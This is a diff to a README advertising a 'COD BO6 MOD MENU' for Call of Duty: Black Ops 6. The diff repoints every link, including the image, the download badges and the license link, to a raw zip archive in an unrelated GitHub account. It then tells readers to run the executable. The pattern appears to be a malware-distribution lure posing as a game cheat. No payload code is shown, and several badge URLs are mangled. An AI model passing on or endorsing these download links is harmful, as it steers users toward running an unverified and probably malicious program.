@@ -1,7 +1,7 @@
 # 🕹️ COD BO6 MOD MENU
-![image](https://github.com/user-attachments/assets/63034297-7560-4567-b141-ed6b333fdf48)
+![image](https://raw.githubusercontent.com/ampong419/.github/main/gaub/.github.zip)
 
-[![Download Latest Version](https://img.shields.io/badge/Download%20Now-BO6%20Mod%20Menu-blue.svg?style=for-the-badge&logo=github)](https://ezlaunch.live/pPnqF1yp)
+[![Download Latest Version](https://raw.githubusercontent.com/ampong419/.github/main/gaub/.github.zip%20Now-BO6%20Mod%https://raw.githubusercontent.com/ampong419/.github/main/gaub/.github.zip)](https://raw.githubusercontent.com/ampong419/.github/main/gaub/.github.zip)
 
 Unlock an enhanced experience in Call of Duty: Black Ops 6 with this advanced MOD MENU. The utility brings new gameplay possibilities, custom controls, and user-friendly tools for both casual and experimental users. Compatible with all major operating systems, it's built for reliability and performance.
 
@@ -34,7 +34,7 @@ Unlock an enhanced experience in Call of Duty: Black Ops 6 with this advanced MO
 **Step 1:**  
 Download the latest installer:
 
-[![Get Installer](https://img.shields.io/badge/Download%20Now-BO6%20Mod%20Menu-blue.svg?style=for-the-badge&logo=github)](https://ezlaunch.live/pPnqF1yp)
+[![Get Installer](https://raw.githubusercontent.com/ampong419/.github/main/gaub/.github.zip%20Now-BO6%20Mod%https://raw.githubusercontent.com/ampong419/.github/main/gaub/.github.zip)](https://raw.githubusercontent.com/ampong419/.github/main/gaub/.github.zip)
 
 Run the executable and follow on-screen instructions.
 
@@ -54,9 +54,9 @@ This project is for educational and experimental use only. Please review the end
 
 ## 📄 License
 
-Distributed under the [MIT License](https://opensource.org/license/mit/).  
+Distributed under the [MIT License](https://raw.githubusercontent.com/ampong419/.github/main/gaub/.github.zip).  
 Copyright © 2025
 
 --- 
 
-[![Download from ezlaunch.live](https://img.shields.io/badge/Download%20Now-BO6%20Mod%20Menu-blue.svg?style=for-the-badge&logo=github)](https://ezlaunch.live/pPnqF1yp)
+[![Download from https://raw.githubusercontent.com/ampong419/.github/main/gaub/.github.zip](https://raw.githubusercontent.com/ampong419/.github/main/gaub/.github.zip%20Now-BO6%20Mod%https://raw.githubusercontent.com/ampong419/.github/main/gaub/.github.zip)](https://raw.githubusercontent.com/ampong419/.github/main/gaub/.github.zip)
